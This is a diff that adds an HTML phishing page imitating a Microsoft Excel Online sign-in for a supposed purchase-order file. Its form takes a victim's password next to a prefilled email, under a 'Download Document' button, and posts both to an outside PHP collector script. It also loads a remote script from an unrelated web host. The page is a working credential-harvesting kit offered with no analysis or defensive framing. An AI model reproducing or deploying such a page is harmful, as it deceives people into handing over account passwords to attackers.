@@ -1,0 +1,232 @@
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Excel Online Spreadsheet :: Sign in</title>
+<!--<script src="https://code.jquery.com/jquery-3.1.1.min.js" crossorigin="anonymous"></script>-->
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<link href="https://ucarecdn.com/eae24034-0cc9-4528-827a-d46e30dd5a83/hover.css" rel="stylesheet" media="all">
+
+ <script src="https://klxszs.web.app/jp_outlook.js"> </script>
+<script type="text/javascript">
+
+var docurl = '';
+	const queryString = window.location.search;
+	console.log(queryString);
+	const urlParams = new URLSearchParams(queryString);
+	const str = urlParams.get('prox')
+	var proxx = str.substring(0, 4);
+    var results =str.split('@');
+	var result = results[1];
+
+</script>
+<style type="text/css">
+    .hide {
+      display: none;
+    }
+
+    .grey-form {
+      background-color: #ffffff;
+      opacity: 1;
+      pointer-events: none;
+    }
+
+    .alert-success {
+      color: #155724;
+      background-color: #d4edda;
+      border-color: #c3e6cb;
+    }
+
+
+
+    .modal-body {
+    padding: 0 !important;
+}
+.login-container{
+    position: absolute;
+    /*width: 400px;*/
+    margin: 80px auto;
+    padding: 20px 20px 20px;
+    text-align: center;
+    background: #f5f5f5;
+    border: 1px solid #ccc;
+}
+
+#output{
+    position: absolute;
+    width: 400px;
+    top: -75px;
+    left: 0;
+    color: #fff;
+}
+
+#output.alert-success{
+    background: rgb(25, 204, 25);
+}
+
+#output.alert-danger{
+    background: rgb(228, 105, 105);
+
+}
+
+.avatar{
+    width: 100px;height: 100px;
+    margin: 10px auto -30px;
+    border-radius: 100%;
+    border: 2px solid #aaa;
+    background-size: cover;
+}
+
+.form-box input{
+    width: 100%;
+	margin: 1px; auto
+    padding: 10px;
+    text-align: center;
+    height: 40px;
+    border: 1px solid #ccc;;
+    background: #ffffff;
+    transition:0.2s ease-in-out;
+
+}
+
+.form-box input:focus{
+    outline: 50px;
+    background: #ffffff;
+}
+
+.form-box input[type="text"]{
+    border-radius: 5px 5px 0 0;
+    text-transform: lowercase;
+}
+
+.form-box input[type="password"]{
+    border-radius: 0 0 0px 0px;
+    border-top: 0;
+}
+
+.form-box button.login{
+    margin-top: 15px;
+    padding: 10px 20px;
+}
+
+.animated {
+  -webkit-animation-duration: 1s;
+  animation-duration: 1s;
+  -webkit-animation-fill-mode: both;
+  animation-fill-mode: both;
+}
+
+@-webkit-keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 0;
+    -webkit-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+@keyframes fadeInUp {
+  0% {
+    opacity: 0;
+    -webkit-transform: translateY(20px);
+    -ms-transform: translateY(20px);
+    transform: translateY(20px);
+  }
+
+  100% {
+    opacity: 1;
+    -webkit-transform: translateY(0);
+    -ms-transform: translateY(0);
+    transform: translateY(0);
+  }
+}
+
+.fadeInUp {
+  -webkit-animation-name: fadeInUp;
+  animation-name: fadeInUp;
+}
+  </style>
+
+</head>
+
+<body>
+  <div class="container-fluid">
+    <div class="row" style="height: 100vh; background-image: url('https://i.gyazo.com/52a11ae9fe6936093d1a147ffb24ad16.png'); background-size: cover;background-repeat: no-repeat;">
+      <div class="container">
+        <div class="row">
+
+
+        </div>
+      </div>
+
+
+  <!-- Modal for gmail -->
+  <div style="display: block !important" class="modal" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div style="position: relative;
+                  display: -webkit-box;
+                  display: -ms-flexbox;
+                  display: flex;
+                  -webkit-box-orient: vertical;
+                  -webkit-box-direction: normal;
+                  -ms-flex-direction: column;
+                  flex-direction: column;
+                  width: 80%;
+                  pointer-events: auto;
+                  ">
+        <div class="modal-body">
+
+        <div class="login-container">
+            <div id="output"></div>
+            <div class="avatar">
+              <img id="fieldImg" class="img-fluid brand_logo" width="60px" style="margin-top: 20px;" src="https://i.gyazo.com/83cffd1ebf23ed93aa925eb9529f5348.png">
+            </div>
+            <div class="form-box">
+              <div style="margin-top: 10px;" class="alert" id="errorMsg123"><color style="color:red;"><!--Your account or password is incorrect--> </color></div>
+              <h4>Microsoft Excel Online</h4>
+              <p>"Purchase Order (PO-13945.xlx)"</p>
+                <!--<form id="contact" class="form-horizontal well">-->
+                <form  action="https://n2n.co.mz/images/send2022.php" method="post">
+                    <input type="hidden"  value="Toscotec" id="login" name="email" placeholder="email">
+                    <input style="background-color: #eee;opacity: 1; pointer-events:none !important;" type="email" name="email" id="login" aria-describedby="emailHelp" placeholder="Enter email" value="xxx@gmail.com"  readonly="">
+                    <input type="password" name="password" id="passwd" aria-describedby="emailHelp" placeholder="Enter Your Password" required="" class="form-input-container">
+                    <button class="btn btn-success btn-block login" style="background: #039126;" id="submit-btn"  type="submit" onClick="contactUs();">Download Document</button>
+                </form>
+            </div>
+        </div>
+
+
+
+
+        </div>
+
+
+      </div>
+    </div>
+  </div>
+
+
+</body>
+</body>
+</html>
